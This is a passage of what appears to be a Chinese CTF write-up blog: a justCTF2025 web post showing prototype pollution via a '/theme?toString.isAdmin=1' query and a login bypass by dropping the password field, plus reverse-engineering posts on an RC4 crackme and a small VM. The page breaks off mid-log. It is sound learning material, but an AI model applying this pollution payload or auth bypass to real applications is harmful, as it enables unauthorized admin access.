<p>然后确保 <code>users[某属性]</code> 的<code>.isAdmin</code> 值为 1，就可以使得 <code>if</code> 条件判断为真，进获取 <code>FLAG</code> 。</p>
<p>综上所述，攻击思路如下：</p>
<p>​	1）通过原型链污染原型Object的属性（如 <code>constructor</code>，<code>hasOwnProperty</code>和 <code>toString</code> 等），在该受污染属性上添加 <code>isAdmin</code> 、并将值设置为1 。</p>
<p>​	2）尝试以该属性名称为 <code>username</code> 注册&#x2F;登录系统，则 <code>users[受污染属性].isAdmin</code>  值为1 ，然后访问 <code>/flag</code> 即可获取FLAG。</p>
<p>第1步前面已讨论过，存在递归合并函数 <code>deepMerge</code> ，可以实现原型链污染。下面讨论第2步如何实现以特殊用户（属性名称）登录系统</p>
<p><strong>五、登录认证绕过</strong></p>
<p>尝试以原型Object的属性名称注册&#x2F;登录用户，以 <code>toString</code> 为例（使用其它继承自<code>Object</code>的属性，如 <code>constructor</code>，<code>hasOwnProperty</code>和 <code>toLocalString</code> 等都可以）。</p>
<p>理想情况是先注册、再登录。但是在注册时提示用户已经存在：</p>
<style>.fwovxxfnqnjh{zoom: 50%;}</style><img src="/2025/08/10/justCTF2025/image-20250812201006695.png" class="fwovxxfnqnjh" alt="image-20250812201006695">

<p>查看注册相关的代码：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/register&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; username, password &#125; = req.<span class="property">body</span>;</span><br><span class="line">  <span class="comment">// 判断用户名是否存在</span></span><br><span class="line">  <span class="keyword">if</span> (users[username]) &#123;</span><br><span class="line">    req.<span class="property">session</span>.<span class="property">errorMessage</span> = <span class="string">&#x27;User already exists!&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&#x27;/register&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  ......</span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure>

<p>如前所述，<code>users</code> 的原型为 <code>Object</code> 。当 <code>username</code> 为 <code>toString</code>时，因为<code>users</code>自身不包含 <code>toString</code> 属性，故<code>users[username]</code> 返回的是<code>users.__proto__.toString</code> 即<code>Object.toString</code> 方法。如下：</p>
<style>.ejypiluwzbts{zoom:67%;}</style><img src="/2025/08/10/justCTF2025/image-20250812201644955.png" class="ejypiluwzbts" alt="image-20250812201644955">

<p><code>users[username]</code>非空，返回用户已存在，所以没有办法再次注册。</p>
<p>尝试 <code>toString/123</code> 直接登录，调试发现执行到304行验证用户名和密码时，关键变量的值如下：</p>
<p><img src="/image-20250812202547181-1762342243354-5.png" alt="image-20250812202547181"></p>
<p>​	<code>user</code> 值为 <code>Object.toString()</code> 方法，非空；</p>
<p>​	<code>user.password</code> &#x3D;&#x3D; <code>toString().password</code> &#x3D;&#x3D; <code>undefined</code></p>
<p>故要想通过304行的检查，将变量 <code>password</code> 的值设置为 <code>undefined</code> 即可。这样就可以绕过认证，以用户名 <code>toString</code> 成功登录系统。</p>
<p><strong>六、攻击步骤</strong></p>
<p>结合以上分析，可执行的攻击步骤如下：</p>
<ol>
<li>污染原型属性 <code>Object.toString</code></li>
</ol>
<p>原型链污染发生的函数为 <code>deepMerge</code>，其调用链为：</p>
<p>​	 <code>app.get(&#39;/theme&#39;,isAuthenticated,...)</code>  –&gt;  <code>parseQueryParams</code>  –&gt;  <code>deepMerge</code> </p>
<p>访问 &#x2F;theme 时需要用户已经登录，故先注册、登录普通用户 <code>user1</code> ，然后通过传递 <code>toString.isAdmin=1</code> 的查询参数，污染 <code>Object.prototype.toString</code>，在<code>toString</code>上添加 <code>isAdmin</code>、并将值置为 1 </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 原型污染 url</span><br><span class="line">http://<span class="number">192.168</span><span class="number">.43</span><span class="number">.148</span>:<span class="number">3000</span>/theme?toString.isAdmin=<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>访问过程中<code>parseQueryParams</code> 函数会生成对象：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; <span class="attr">toString</span>: &#123; <span class="attr">isAdmin</span>: <span class="string">&quot;1&quot;</span> &#125; &#125;</span><br></pre></td></tr></table></figure>

<p>随后调用 <code>deepMerge</code> 函数合并对象时，会将 <code>&#123; isAdmin: &quot;1&quot; &#125;</code> 合并到 <code>Object.prototype.toString</code> 上，导致所有对象的 <code>toString.isAdmin</code> 被污染。下图是污染前后 的<code>toString</code> ，可以看到污染后的 <code>toString</code> 多了 <code>isAdmin</code> 属性，且值为1：</p>
<style>.mhlctgkixrru{zoom:67%;}</style><img src="/2025/08/10/justCTF2025/image-20250812205418685.png" class="mhlctgkixrru" alt="image-20250812205418685">



<ol start="2">
<li>登录为 <code>toString</code> 用户</li>
</ol>
<p>污染成功后，使用 <code>toString</code>用户名登录，<code>password</code>处随便填写，使用bp抓包后删除<code>password</code>字段后发送</p>
<p>页面跳转后说明登录成功，然后访问 &#x2F;flag 成功</p>
<p><img src="/gKArT-n1j8HpMhq69a5SQdMfXrSCd1B072R-nVOSWVA.png" alt="gKArT-n1j8HpMhq69a5SQdMfXrSCd1B072R-nVOSWVA"></p>
<h4 id="题目总结"><a href="#题目总结" class="headerlink" title="题目总结"></a>题目总结</h4><h5 id="考察点"><a href="#考察点" class="headerlink" title="考察点"></a>考察点</h5><ol>
<li>JS原型链污染漏洞利用及扩展</li>
<li>登录认证函数逻辑漏洞的识别与利用</li>
</ol>
<h5 id="关键技巧"><a href="#关键技巧" class="headerlink" title="关键技巧"></a>关键技巧</h5><ol>
<li><strong>原型污染扩展</strong>：</li>
</ol>
<p>​	利用原生属性（如 <code>toString</code>）绕过对 <code>__proto__</code> 的过滤。</p>
<p>​	通过 <code>deepMerge</code> 将污染扩散到原型链。</p>
<ol start="2">
<li><strong>认证函数逻辑漏洞</strong>：</li>
</ol>
<p>​	利用 <code>users</code> 对象继承 <code>Object.prototype</code> 的特性，使 <code>toString</code> 成为“已存在用户”。</p>
<p>​	通过 <code>undefined === undefined</code> 绕过密码检查。</p>
<p>参考链接：<a target="_blank" rel="noopener" href="https://gist.github.com/terjanq/fa6f19d46bcb85bb61c146747dec0758#positive-players--write-up-by-terjanq">https://gist.github.com/terjanq/fa6f19d46bcb85bb61c146747dec0758#positive-players--write-up-by-terjanq</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2025/08/10/justCTF2025/" data-id="cuidT5qwmRvaiqEwgrJT4VupB" data-title="justCTF2025 web" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-SWPUCTF2024" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/11/26/SWPUCTF2024/" class="article-date">
  <time class="dt-published" datetime="2024-11-26T08:07:31.000Z" itemprop="datePublished">2024-11-26</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2024/11/26/SWPUCTF2024/">SWPUCTF2024</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h3 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h3><ul>
<li>题目名称：[SWPUCTF 2024 秋季新生赛] 动态调试 </li>
<li>题目链接：<a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/5985">https://www.nssctf.cn/problem/5985</a></li>
<li>考点清单：动态调试，RC4</li>
<li>工具清单：IDA Pro，Die，dbg</li>
</ul>
<h3 id="4-1-看到什么"><a href="#4-1-看到什么" class="headerlink" title="4.1 看到什么"></a>4.1 看到什么</h3><p><em><strong>题目关键信息列表：</strong></em></p>
<p>下载附件后发现是rc4.exe文件</p>
<h3 id="4-2-解题思路"><a href="#4-2-解题思路" class="headerlink" title="4.2 解题思路"></a>4.2 解题思路</h3><p>根据文件名，能想到涉及到RC4加密算法，所以先了解RC4加密算法才能做出来.</p>
<p>常见的rc4流程：</p>
<ol>
<li>初始化密钥流</li>
<li>使用伪随机算法处理密钥流</li>
<li>将明文与密钥流逐字节异或，输出密文</li>
</ol>
<p>接下来就是查壳，有壳脱，无壳直接丢进IDA进行静态调试分析，分析不出就用动态调试，再写脚本得出flag。<del>（简单粗暴）</del></p>
<p>这个题其实只用静态调试就能做出来，我第一遍就是这样，但是多少有些不尊重题目名字，于是用动态又做了一遍，发现动态简单许多，别有一番风味。</p>
<h3 id="4-3-✅-尝试过程和结果记录"><a href="#4-3-✅-尝试过程和结果记录" class="headerlink" title="4.3 ✅ 尝试过程和结果记录"></a>4.3 ✅ 尝试过程和结果记录</h3><ol>
<li><p>查壳，发现64位无壳</p>
<style>.tvayxpqmmhpc{zoom:67%;}</style>
</li>
<li><p>丢进IDA，按下F5之后，观察和分析函数</p>
<style>.ibxpmetzhsqr{zoom:67%;}</style>

<p>首先将用户输入存在V2中，v3是密钥key的长度， <code>rc4_init(s, key, v3)</code>就是初始化密钥的函数</p>
<p><code>puts(&quot;....&quot;)/puts(&quot;..........&quot;)/.../puts(&quot;........................&quot;)</code>夹杂 <code>Sleep(500)</code> ，这部分是模拟正在处理（没有什么用，<del>没开会员的某度网盘估计就有一堆sleep</del>）</p>
<p> <code>rc4_crypt(s, v2, len)</code>便是加密函数，最后将处理后的V2和V1进行比较，全都相同就是正确的flag，那么思路就是V1反方向进行RC4解密即可，于是有两种做法。</p>
<h4 id="静态："><a href="#静态：" class="headerlink" title="静态："></a>静态：</h4><ol>
<li><p>首先得知道，如果要只凭静态调试得出flag，我们需要知道V1和key，还有详细的 <code>rc4_init(s, key, v3)</code>和 <code>rc4_crypt(s, v2, len)</code>流程，才能写出逆向脚本求得flag，所以我们一个个去寻找和分析。</p>
</li>
<li><p>待解密的V1和密钥key如下：</p>
<style>.vzorgqceuvsi{zoom:67%;}</style>

<style>.scybeyfgynwr{zoom:67%;}</style>

<p>我一般喜欢看16进制的界面（方便复制写脚本），如下：</p>
<style>.uphphbfmvccx{zoom:67%;}</style>

<style>.xfyuscgifvjb{zoom:67%;}</style>

<p>所以</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">V1=[</span><br><span class="line">    0xCF, 0xA0, 0xC7, 0x24, 0x93, 0xEC, 0x51, 0xFB, 0x5E, 0xA5, 0xEE, 0xC5,</span><br><span class="line">    0xE7, 0xEA, 0xBB, 0x4A, 0xE0, 0x6E, 0x16, 0x63, 0xF0, 0x1A, 0x91, 0x04,</span><br><span class="line">    0xC1, 0x7E, 0x3F, 0x2B, 0x4F, 0x53, 0xB0, 0x62, 0xA3, 0xA1, 0xCF, 0xC1,</span><br><span class="line">    0x73, 0x85, 0x5F, 0xEC, 0x14, 0xD8, 0xD4, 0xE2, 0x00</span><br><span class="line">]</span><br><span class="line">key = b&quot;ysyy_114514&quot;</span><br></pre></td></tr></table></figure>
</li>
<li><p>接下来便是 <code>rc4_init</code>和 <code>rc4_crypt</code>函数</p>
<p><code>rc4_init</code>如下：</p>
<style>.bhhksoejwuil{zoom:67%;}</style>

<p>显然，这是RC4 加密算法中标准的<strong>密钥调度算法KSA</strong>，总结就是<code>s</code> 是一个被打乱的 0~255 的排列，它的顺序取决于提供的 <code>key</code>。这个数组 <code>s</code> 就是后续 RC4 加密&#x2F;解密过程中使用的密钥流的前身，也就是基础。</p>
<p><code>rc4_crypt</code>如下：</p>
<style>.nsikyzhdxnvt{zoom:67%;}</style>

<p>这部分就是RC4的加密函数，但是和标准的RC4有区别，新增了 <code>+ key[k % strlen(key)]</code> 这部分，说明出题人偷偷加了点自己的东西，但不多，影响不大。</p>
<p>流程是：</p>
<ol>
<li>每处理一个字节时，更新索引 <code>i</code> 和 <code>j</code>。</li>
<li>交换 <code>s[i]</code> 和 <code>s[j]</code>。</li>
<li>生成一个密钥字节：<code>s[(s[i] + s[j]) % 256]</code>。</li>
<li>用偏移后的密钥字节和明文异或：<code>Data[k] ^= key_byte+偏移值</code>，偏移值就是**<code>key[k % strlen(key)]</code>**，标准RC4是没有的。</li>
</ol>
</li>
<li><p>那么都齐全了，就可以写出逆向脚本了，我写的如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">key = b&quot;ysyy_114514&quot;</span><br><span class="line"></span><br><span class="line">v1 = bytes([</span><br><span class="line">    0xCF, 0xA0, 0xC7, 0x24, 0x93, 0xEC, 0x51, 0xFB, 0x5E, 0xA5, 0xEE, 0xC5,</span><br><span class="line">    0xE7, 0xEA, 0xBB, 0x4A, 0xE0, 0x6E, 0x16, 0x63, 0xF0, 0x1A, 0x91, 0x04,</span><br><span class="line">    0xC1, 0x7E, 0x3F, 0x2B, 0x4F, 0x53, 0xB0, 0x62, 0xA3, 0xA1, 0xCF, 0xC1,</span><br><span class="line">    0x73, 0x85, 0x5F, 0xEC, 0x14, 0xD8, 0xD4, 0xE2, 0x00</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line">def rc4_init(key: bytes):</span><br><span class="line">    # 初始化状态 S 和辅助数组 K</span><br><span class="line">    S = list(range(256))</span><br><span class="line">    K = [key[i % len(key)] for i in range(256)]</span><br><span class="line">    j = 0</span><br><span class="line">    for i in range(256):</span><br><span class="line">        j = (j + S[i] + K[i]) &amp; 0xFF</span><br><span class="line">        S[i], S[j] = S[j], S[i]</span><br><span class="line">    return S</span><br><span class="line"></span><br><span class="line">def rc4_crote(S: list, data: bytearray, key: bytes):</span><br><span class="line">    i = 0</span><br><span class="line">    j = 0</span><br><span class="line">    for idx in range(len(data)):</span><br><span class="line">        i = (i + 1) &amp; 0xFF</span><br><span class="line">        j = (j + S[i]) &amp; 0xFF</span><br><span class="line">        S[i], S[j] = S[j], S[i]</span><br><span class="line">        ks = S[(S[i] + S[j] + 1) &amp; 0xFF]</span><br><span class="line">        data[idx] = ((key[idx % len(key)] + ks) &amp; 0xFF) ^ data[idx]</span><br><span class="line"></span><br><span class="line">S = rc4_init(key)</span><br><span class="line"># 用 bytearray 可原地修改</span><br><span class="line">buf = bytearray(v1)</span><br><span class="line">rc4_crote(S, buf, key)</span><br><span class="line"># 以 0x00 为结束符，打印前面的所有字符</span><br><span class="line">flag = buf.split(b&#x27;\x00&#x27;, 1)[0].decode(&#x27;utf-8&#x27;, errors=&#x27;ignore&#x27;)</span><br><span class="line">print(&quot;flag =&quot;, flag)</span><br></pre></td></tr></table></figure>

<p>运行即可得到flag：<code>NSSCTF&#123;0d6f90ac-4b5e-4efb-8502-6349cf798f2e&#125;</code></p>
</li>
</ol>
<h4 id="动态："><a href="#动态：" class="headerlink" title="动态："></a>动态：</h4><ol>
<li>动态调试的工具，常见的就有：dbg，OD（Ollydbg），GDB（ELF文件）等等。这里当然IDA也是具备一定的动态调试能力，所以这道也可以试试IDA的动态调试</li>
<li>首先我们都知道RC4是对称加密算法，那么我们可以将原来代码中把 <code>v2</code> 内容直接改成 <code>v1</code> 的内容（密文），把 <code>len</code> 改为 <code>v1</code> 的长度</li>
</ol>
<p>那么接下来调用的 <code>rc4_crypt</code> 实际是：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">明文 = 密文 ⊕ keystream</span><br></pre></td></tr></table></figure>

<p>那么利用程序本身就可以得出flag，，不需要自己去编写脚本了！</p>
<ol start="3">
<li><p>那么开始吧（来自师傅llc43212）：</p>
</li>
<li><p>在<code>rc4_crypt</code> 按下F2设置断点，同时IDA进入调试模式</p>
<style>.enoinpndcngy{zoom:67%;}</style>
</li>
<li><p>然后随便输入字符串，断点在<code>rc4_crypt</code> </p>
<style>.xsuliwstilnq{zoom:67%;}</style>
</li>
<li><p>然后一步步到 4019E8 停下. 接下来修改寄存器的值,</p>
<p>首先是传入的 Len 变量, 我们把它修改成密文一样的长度44</p>
<style>.bneyacytsurr{zoom:67%;}</style>
</li>
<li><p>右键 <strong>R8</strong> 寄存器然后选择 <strong>Modify Value,</strong> 输入 <strong>2C</strong></p>
<p>接下来我们返回源码窗口，找到 v1 的地址<br>然后将%rdx 修改为 v1 的地址</p>
<style>.gewlllyrbjgy{zoom:67%;}</style>

<p>然后返回源码窗口一步步调试. 再次进入 v1</p>
<style>.egiunhebgymh{zoom:67%;}</style>

<p>它的值已经被修改成flag，转成字符即可。</p>
</li>
</ol>
</li>
</ol>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/11/26/SWPUCTF2024/" data-id="cuideJrVPxhBRLxIjXzfMIf94" data-title="SWPUCTF2024" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-S1mpleVM" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/11/17/S1mpleVM/" class="article-date">
  <time class="dt-published" datetime="2024-11-17T14:05:32.000Z" itemprop="datePublished">2024-11-17</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2024/11/17/S1mpleVM/">S1mpleVM</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="S1mpleVM"><a href="#S1mpleVM" class="headerlink" title="S1mpleVM"></a>S1mpleVM</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if ( (unsigned int)sub_140001D30(v30, v8) )</span><br><span class="line">&#123;</span><br><span class="line">  sub_1400011B0(&quot;Ultimate secret box is not only the name muahahaha&quot;);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以找到最关键的函数 <code>sub_140001D30</code> 就是 VM 入口</p>
<p>查看这个函数有很明显的 vm_handler</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall vmrun(char *input, char *vmcode)</span><br><span class="line">&#123;</span><br><span class="line">  //some defs for local variable</span><br><span class="line">  v2 = 0LL;</span><br><span class="line">  v3 = *vmcode - 16;</span><br><span class="line">  v5 = v48;</span><br><span class="line">  v6 = vmcode + 1;</span><br><span class="line">  while ( 2 )</span><br><span class="line">  &#123;</span><br><span class="line">    switch ( v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      case 0u:</span><br><span class="line">        if ( v2 )</span><br><span class="line">        &#123;</span><br><span class="line">          v9 = v2;</span><br><span class="line">          v2 = (signed int *)*((_QWORD *)v2 + 1);</span><br><span class="line">          v7 = *v9;</span><br><span class="line">          free(v9);</span><br><span class="line">          if ( v2 )</span><br><span class="line">          &#123;</span><br><span class="line">            v10 = v2;</span><br><span class="line">            v2 = (signed int *)*((_QWORD *)v2 + 1);</span><br><span class="line">            v8 = *v10;</span><br><span class="line">            free(v10);</span><br><span class="line">          &#125;</span><br><span class="line">          else</span><br><span class="line">          &#123;</span><br><span class="line">            v8 = 0x80000000;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">          v7 = 0x80000000;</span><br><span class="line">          v8 = 0x80000000;</span><br><span class="line">        &#125;</span><br><span class="line">        v11 = (signed int *)j__malloc_base(0x10uLL);</span><br><span class="line">        *v11 = v7 % v8;</span><br><span class="line">        goto LABEL_53;</span><br><span class="line">      case 1u:</span><br><span class="line">        //...</span><br><span class="line">LABEL_53:</span><br><span class="line">      *((_QWORD *)v11 + 1) = v2;</span><br><span class="line">      v2 = v11;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>恢复结构体之后这个 vm 还是很一目了然的，下面解释一下各个 opcode 的作用。</p>
<ul>
<li>0：取模操作（先弹出的值在运算符左侧）</li>
<li>1：push 操作</li>
<li>2：pop 操作</li>
<li>3：乘法操作</li>
<li>4：加法操作</li>
<li>5：输出</li>
<li>6：取输入指针</li>
<li>7：右移位后取最低位（先弹出的值在运算符右侧）</li>
<li>8：异或操作</li>
<li>9：输入指针+1</li>
<li>10：返回</li>
<li>11：减法操作（先弹出的值在运算符左侧）</li>
<li>12：除法操作（先弹出的值在运算符左侧）</li>
</ul>
<p>运行根据程序写的cpp文件，</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">g++ test.cpp -o test</span><br><span class="line">./test</span><br><span class="line">./test &gt; output.txt</span><br></pre></td></tr></table></figure>

<p>节选一段log：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">get 1 input</span><br><span class="line">push val 102</span><br><span class="line">push val 0</span><br><span class="line">calc (102&gt;&gt;0)&amp;1=0</span><br><span class="line">push val 0</span><br><span class="line">push val 2</span><br><span class="line">calc 2*0=0</span><br><span class="line">push val 0</span><br><span class="line">get 1 input</span><br><span class="line">push val 102</span><br><span class="line">push val 1</span><br><span class="line">calc (102&gt;&gt;1)&amp;1=1</span><br><span class="line">push val 1</span><br><span class="line">push val 3</span><br><span class="line">calc 3*1=3</span><br><span class="line">push val 3</span><br><span class="line">get 1 input</span><br><span class="line">push val 102</span><br><span class="line">push val 2</span><br><span class="line">calc (102&gt;&gt;2)&amp;1=1</span><br><span class="line">push val 1</span><br><span class="line">push val 67</span><br><span class="line">calc 67*1=67</span><br><span class="line">push val 67</span><br><span class="line">get 1 input</span><br><span class="line">push val 102</span><br><span class="line">push val 3</span><br><span class="line">calc (102&gt;&gt;3)&amp;1=0</span><br><span class="line">push val 0</span><br><span class="line">push val 37</span><br><span class="line">calc 37*0=0</span><br><span class="line">push val 0</span><br><span class="line">get 1 input</span><br><span class="line">push val 102</span><br><span class="line">push val 4</span><br><span class="line">calc (102&gt;&gt;4)&amp;1=0</span><br><span class="line">push val 0</span><br><span class="line">push val 41</span><br><span class="line">calc 41*0=0</span><br><span class="line">push val 0</span><br><span class="line">get 1 input</span><br><span class="line">push val 102</span><br><span class="line">push val 5</span><br><span class="line">calc (102&gt;&gt;5)&amp;1=1</span><br><span class="line">push val 1</span><br><span class="line">push val 11</span><br><span class="line">calc 11*1=11</span><br><span class="line">push val 11</span><br><span class="line">get 1 input</span><br><span class="line">push val 102</span><br><span class="line">push val 6</span><br><span class="line">calc (102&gt;&gt;6)&amp;1=1</span><br><span class="line">push val 1</span><br><span class="line">push val 13</span><br><span class="line">calc 13*1=13</span><br><span class="line">push val 13</span><br><span class="line">get 1 input</span><br><span class="line">push val 102</span><br><span class="line">push val 7</span><br><span class="line">calc (102&gt;&gt;7)&amp;1=0</span><br><span class="line">push val 0</span><br><span class="line">push val 89</span><br><span class="line">calc 89*0=0</span><br><span class="line">push val 0</span><br><span class="line">calc 0+13=13</span><br><span class="line">push val 13</span><br><span class="line">calc 13+11=24</span><br><span class="line">push val 24</span><br><span class="line">calc 24+0=24</span><br><span class="line">push val 24</span><br><span class="line">calc 24+0=24</span><br><span class="line">push val 24</span><br><span class="line">calc 24+67=91</span><br><span class="line">push val 91</span><br><span class="line">calc 91+3=94</span><br><span class="line">push val 94</span><br><span class="line">calc 94+0=94</span><br><span class="line">push val 94</span><br><span class="line">push val 70</span><br><span class="line">calc 70^94=24</span><br><span class="line">push val 24</span><br><span class="line">get 2 input</span><br><span class="line">push val 108</span><br><span class="line">push val 0</span><br><span class="line">calc (108&gt;&gt;0)&amp;1=0</span><br></pre></td></tr></table></figure>

<p>最前面输出了一句话：Thank for providing passcode, my ultimate secret box is checking…</p>
<p>跳过之后，发现它在频繁的取输入字符并做 <code>(x&gt;&gt;y)&amp;1</code> 的运算，y 从 <code>0~7</code>。这是在一个一个取出输入字节的每一位，每一位都对应了一个权值。第一个字节可以看出来，从低位到高位权值分别为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2 3 67 37 41 11 13 89</span><br></pre></td></tr></table></figure>

<p>得到权值的方法：在 <code>*</code> 运算中加入 <code>fprintf(stderr,&quot;%d,&quot;,reg2);</code></p>
<p>最后，它将所有权值相加，得到的结果和 70 做异或运算得到 24，将该值存入栈底。</p>
<p>得到异或目标值：在异或的 opcode 中加入 <code>fprintf(stderr,&quot;%d,&quot;,reg2);</code></p>
<p>看log的最后</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span 